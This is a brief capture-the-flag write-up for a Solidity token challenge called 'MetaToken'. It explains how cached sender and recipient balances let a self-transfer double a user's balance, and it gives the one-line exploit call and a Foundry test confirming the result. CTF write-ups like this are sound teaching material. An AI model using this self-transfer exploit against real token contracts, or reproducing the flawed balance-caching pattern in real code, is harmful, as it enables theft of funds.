# MetaToken

## Description

There is a new metatoken in the market. Alice and Bob have already bought it. Don't miss out on it

## Objective of CTF

Drain as much eth+weth you can from every contract and meet the assertions

### Solution

- Since the balances of from & to are cached in the first lines of the transfer function we can double our balance by sending our complete balance to ourself this will result in frombalance & tobalance being 100, at the end we subtract the amount by the chached value in this line `_balances[_from] = frombalance - _amount;` after that we add the amount to our cached `tobalance` which will be 100 + 100 => 200 in this piece of code `_balances[_to] = tobalance + _amount;`

### Steps

- Just call \_factory.transfer(user1, user1, 100)

### Attacker Contract

- Not needed

### Test

```solidity
 function testFactory() public {
        vm.prank(user1);
        _factory.transfer(user1, user1, 100);

        uint256 newbalance = _factory.checkbalance(user1);
        assertEq(newbalance, 200);
    }
```
